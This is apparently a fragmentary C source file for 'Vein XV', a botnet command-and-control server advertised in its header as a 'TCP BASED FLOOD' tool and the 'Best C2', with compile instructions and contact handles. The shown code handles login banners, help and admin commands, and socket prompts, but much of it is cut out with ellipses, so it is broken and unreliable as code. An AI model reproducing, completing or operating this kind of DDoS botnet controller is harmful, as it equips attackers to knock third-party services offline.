/*                                                                                          
	...
	Usages: gcc script.c -o script -pthread
     __________________________________________________________
	  ...
	  cords: dawfawfdwadaw | freshcxts | meowsec.
     __________________________________________________________
	...
	║           ---           ║║═════════════════════════║
	║           V2.0          ║║═════════════════════════║
	║   TCP BASED FLOOD       ║║      Best C2 In com     ║
	╚═════════════════════════╝╚═════════════════════════╝ V2.0
	Features V2.0:
...
fclose(fp1);
				...
				sprintf(banner2,  "\e[37mHello, \e[37mwelcome to \e[37mVein XV\e[37m\r\n", accounts[find_line].username);
		...
		while(1) {
		char input [5000];
        sprintf(input, "\e[37m%s\e[37mVein XV ~ \e[37m", userlog);
      ...
      if(strstr(buf, "help") || strstr(buf, "HELP") || strstr(buf, "?") || strstr(buf, "helpme") || strstr(buf, "Help")) {
		...
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
 		      ...
 		      if(strstr(buf, "admin") || strstr(buf, "Admin") || strstr(buf, "ADMIN") || strstr(buf, "adm") || strstr(buf, "admin")) {
				...
				pthread_create(&title, NULL, &TitleWriter, sock);
		char input [5000];
        sprintf(input, "\e[37mVein XV ~ \e[37m");
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				continue;
 		}
 	}
